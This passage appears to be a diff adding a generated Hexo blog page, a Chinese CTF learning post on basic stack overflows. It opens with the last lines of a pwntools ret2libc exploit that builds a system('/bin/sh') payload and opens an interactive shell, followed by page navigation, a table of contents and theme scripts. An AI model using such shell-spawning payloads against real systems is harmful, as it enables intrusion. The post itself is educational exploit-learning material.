puts_binsh_addr</div><div class="line"></div><div class="line">get_shell_payload = padding + p32(system_addr) + p32(0x8048590) + p32(binsh_addr)</div><div class="line">p.sendline(get_shell_payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-11-03, 08:18:51</p>
+        <p><span>最后更新:</span>2016-11-08, 17:44:58</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/11/03/0x26/" title="PWN学习总结之基础栈溢出">http://0x48.pw/2016/11/03/0x26/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/11/03/0x26/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/11/21/0x27/">
+                    PWN学习总结之基础栈溢出2
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/10/14/0x24/">
+                    HITCON 2016 web 总结
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2-PWN1"><span class="toc-number">1.</span> <span class="toc-text">0x2 PWN1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3-PWN2"><span class="toc-number">2.</span> <span class="toc-text">0x3 PWN2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4-PWN3"><span class="toc-number">3.</span> <span class="toc-text">0x4 PWN3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x5-PWN4"><span class="toc-number">4.</span> <span class="toc-text">0x5 PWN4</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/11/21/0x27/" title="上一篇: PWN学习总结之基础栈溢出2">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/10/14/0x24/" title="下一篇: HITCON 2016 web 总结">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
